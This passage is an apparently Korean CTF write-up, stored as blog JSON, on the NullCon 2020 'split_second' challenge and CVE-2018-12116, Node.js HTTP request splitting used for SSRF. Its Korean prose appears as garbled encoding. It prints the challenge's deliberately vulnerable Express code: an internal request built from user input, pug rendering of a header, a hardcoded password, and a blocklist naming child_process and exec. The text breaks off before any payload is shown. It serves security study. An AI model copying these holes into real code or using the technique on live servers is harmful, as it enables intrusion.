{"componentChunkName":"component---src-templates-blog-post-js","path":"/Security/nodejs-HTTP-request-splittingì„-ì´ìš©í•œ-SSRF-ì·¨ì•½ì featNullCon2020-splitsecond-WriteUp/","result":{"data":{"site":{"siteMetadata":{"author":"JaeSeoKim","comment":{"utterances":"JaeSeoKim/jaeseokim.github.io"},"sponsor":{"buyMeACoffeeId":"jaeseokim"}}},"markdownRemark":{"excerpt":"ì´ë²ˆì— TeamMODUì—ì„œ ë‹¤ë¥¸ í˜•ì´ ë°œí‘œí•œ NullCon2020-splitsecond ë¬¸ì œì˜ WriteUpë¥¼ ë³´ë©° ì‹ ê¸°í•˜ê³  ì¬ë¯¸ìˆì–´ ë³´ì—¬ì„œ í•œë²ˆ ê³µë¶€ë¥¼ í•´ë´¤ìŠµë‹ˆë‹¤. CVE-2018-12116 ëŒ€ìƒ : Node.js: All versions prior to Node.js 6.15.0 and 8.14.0 ìœ„í˜‘ : HTTP request splitting Nâ€¦","html":"<p>ì´ë²ˆì— TeamMODUì—ì„œ ë‹¤ë¥¸ í˜•ì´ ë°œí‘œí•œ <strong><a href=\"https://github.com/nullcon/hackim-2020/tree/master/web/split_second\">NullCon<em>2020-split</em>second</a></strong> ë¬¸ì œì˜ WriteUpë¥¼ ë³´ë©° ì‹ ê¸°í•˜ê³  ì¬ë¯¸ìˆì–´ ë³´ì—¬ì„œ í•œë²ˆ ê³µë¶€ë¥¼ í•´ë´¤ìŠµë‹ˆë‹¤.</p>\n<blockquote>\n<h2 id=\"cve-2018-12116\" style=\"position:relative;\"><a href=\"#cve-2018-12116\" aria-label=\"cve 2018 12116 permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://www.cvedetails.com/cve/CVE-2018-12116/\">CVE-2018-12116</a></h2>\n<p>ëŒ€ìƒ : Node.js: All versions prior to Node.js 6.15.0 and 8.14.0</p>\n<p>ìœ„í˜‘ : HTTP request splitting</p>\n<p>Node.Jsê°€ ì •ìƒì ì´ì§€ ì•Šì€ ìœ ë‹ˆì½”ë“œ ë°ì´í„°ë¥¼ path ì˜µì…˜ìœ¼ë¡œ HTTP requestì„ ë°›ì•„ë“¤ì´ë©´ ê·¸ ë°ì´í„°ëŠ” ë‹¤ë¥¸ ë°ì´í„°ë¡œ ë³€í™˜ë˜ì–´ ì‘ë™í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ì ì„ ì´ìš©í•˜ì—¬ HTTP request splitì´ ì‹¤í–‰ ë©ë‹ˆë‹¤.</p>\n<p>ex)</p>\n<p>\\u{01F436} = ğŸ¶ | server -> \\x36 = 6</p>\n<p>\\u{010D} = Ä | server -> \\x0d = \\r</p>\n<p>\\u{010A} = ÄŠ | server -> \\x0a = \\n</p>\n</blockquote>\n<p>ì¼ë‹¨ ì·¨ì•½ì ì˜ ì •ë³´ëŠ” ê°„ë‹¨í•˜ê²Œ ìœ„ì˜ ë‚´ìš©ê³¼ ê°™ìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì·¨ì•½ì ì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ <strong><a href=\"https://github.com/nullcon/hackim-2020/tree/master/web/split_second\">NullCon<em>2020-split</em>second</a></strong> ë¬¸ì œë¥¼ ì˜ˆì œë¡œ ì„¤ëª… í•˜ê² ìŠµë‹ˆë‹¤.</p>\n<p><strong><a href=\"https://github.com/nullcon/hackim-2020/tree/master/web/split_second\">NullCon<em>2020-split</em>second</a></strong></p>\n<h2 id=\"--writeup\" style=\"position:relative;\"><a href=\"#--writeup\" aria-label=\"  writeup permalink\" class=\"toc-header before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>- WriteUp</h2>\n<p>ë¬¸ì œë¥¼ ë³´ë©´ ì¼ë‹¨ dirbursterë¥¼ ì´ìš©í•˜ì—¬ íƒìƒ‰ì„ í•©ë‹ˆë‹¤.</p>\n<p>íƒìƒ‰ ëœ ëª©ë¡//source/getMeme/flag/core</p>\n<p>ì´ë•Œ /sourceì— ì ‘ê·¼ì„ í•˜ê²Œ ë˜ë©´ ì†ŒìŠ¤ì— ëŒ€í•´ ë…¸ì¶œì„ í•´ì¤ë‹ˆë‹¤.</p>\n<pre class=\"grvsc-container one-dark-pro\" data-language=\"js\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk5 mtki\">//node 8.12.0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">express</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;express&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">app</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">express</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">fs</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;fs&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">path</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;path&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">http</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;http&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">require</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;pug&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">sendFile</span><span class=\"mtk1\">(</span><span class=\"mtk11\">path</span><span class=\"mtk1\">.</span><span class=\"mtk3\">join</span><span class=\"mtk1\">(</span><span class=\"mtk4\">__dirname</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;/index.html&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/source&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">sendFile</span><span class=\"mtk1\">(</span><span class=\"mtk11\">path</span><span class=\"mtk1\">.</span><span class=\"mtk3\">join</span><span class=\"mtk1\">(</span><span class=\"mtk4\">__dirname</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;/source.html&quot;</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/getMeme&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&#39;&lt;iframe src=&quot;https://giphy.com/embed/LLHkw7UnvY3Kw&quot; width=&quot;480&quot; height=&quot;480&quot; frameBorder=&quot;0&quot; class=&quot;giphy-embed&quot; allowFullScreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href=&quot;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw&quot;&gt;via GIPHY&lt;/a&gt;&lt;/p&gt;&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/flag&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">ip</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connection</span><span class=\"mtk1\">.</span><span class=\"mtk4\">remoteAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ip</span><span class=\"mtk1\">.</span><span class=\"mtk3\">includes</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;127.0.0.1&quot;</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;adminauth&quot;</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">pug2</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk8\">decodeURI</span><span class=\"mtk1\">(</span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk4\">headers</span><span class=\"mtk1\">[</span><span class=\"mtk6\">&quot;pug&quot;</span><span class=\"mtk1\">])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">x</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pug2</span><span class=\"mtk1\">.</span><span class=\"mtk3\">match</span><span class=\"mtk1\">(</span><span class=\"mtk6\">/</span><span class=\"mtk7\">[a-z]</span><span class=\"mtk6\">/</span><span class=\"mtk10\">g</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk8\">!</span><span class=\"mtk4\">x</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">authheader</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;secretpassword&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">html</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pug</span><span class=\"mtk1\">.</span><span class=\"mtk3\">render</span><span class=\"mtk1\">(</span><span class=\"mtk4\">pug2</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;No characters&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;You need to come from localhost&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">app</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;/core&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">req</span><span class=\"mtk1\">, </span><span class=\"mtk4 mtki\">res</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">req</span><span class=\"mtk1\">.</span><span class=\"mtk11\">query</span><span class=\"mtk1\">.</span><span class=\"mtk4\">q</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">resp</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">q</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">url</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;http://localhost:8081/getMeme?&quot;</span><span class=\"mtk1\"> </span><span class=\"mtk8\">+</span><span class=\"mtk1\"> </span><span class=\"mtk4\">q</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk4\">url</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk3\">blacklist</span><span class=\"mtk1\">(</span><span class=\"mtk4\">url</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">trigger</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk7\">true</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">try</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">http</span><span class=\"mtk1\">.</span><span class=\"mtk3\">get</span><span class=\"mtk1\">(</span><span class=\"mtk4\">url</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">resp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">resp</span><span class=\"mtk1\">.</span><span class=\"mtk3\">setEncoding</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;utf8&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk11\">resp</span><span class=\"mtk1\">.</span><span class=\"mtk3\">on</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;error&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">err</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk10\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">err</span><span class=\"mtk1\">.</span><span class=\"mtk4\">code</span><span class=\"mtk1\"> </span><span class=\"mtk8\">===</span><span class=\"mtk1\"> </span><span class=\"mtk6\">&quot;ECONNRESET&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;Timeout occurs&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk10\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk4\">resp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk3\">on</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;data&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> (</span><span class=\"mtk4 mtki\">chunk</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk4\">resps</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">chunk</span><span class=\"mtk1\">.</span><span class=\"mtk3\">toString</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk4\">resps</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk3\">on</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;error&quot;</span><span class=\"mtk1\">, (</span><span class=\"mtk4 mtki\">e</span><span class=\"mtk1\">) </span><span class=\"mtk10\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk11\">e</span><span class=\"mtk1\">.</span><span class=\"mtk4\">message</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        })</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      } </span><span class=\"mtk10\">catch</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">error</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">console</span><span class=\"mtk1\">.</span><span class=\"mtk3\">log</span><span class=\"mtk1\">(</span><span class=\"mtk4\">error</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk10\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">res</span><span class=\"mtk1\">.</span><span class=\"mtk3\">send</span><span class=\"mtk1\">(</span><span class=\"mtk6\">&quot;search param &#39;q&#39; missing!&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk3\">blacklist</span><span class=\"mtk1\">(</span><span class=\"mtk4 mtki\">url</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">evilwords</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> [</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;global&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;process&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;mainModule&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;require&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;root&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;child_process&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;exec&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&#39;&quot;&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;&#39;&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk6\">&quot;!&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk10\">var</span><span class=\"mtk1\"> </span><span class=\"mtk4\">arrayLen</span><span class=\"mtk1\"> </span><span class=\"mtk8\">=</span><span class=\"mtk1\"> </span><span class=\"mtk11\">evilwords</span><span class=\"mtk1\">.</span><span class=\"mtk4\">length</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 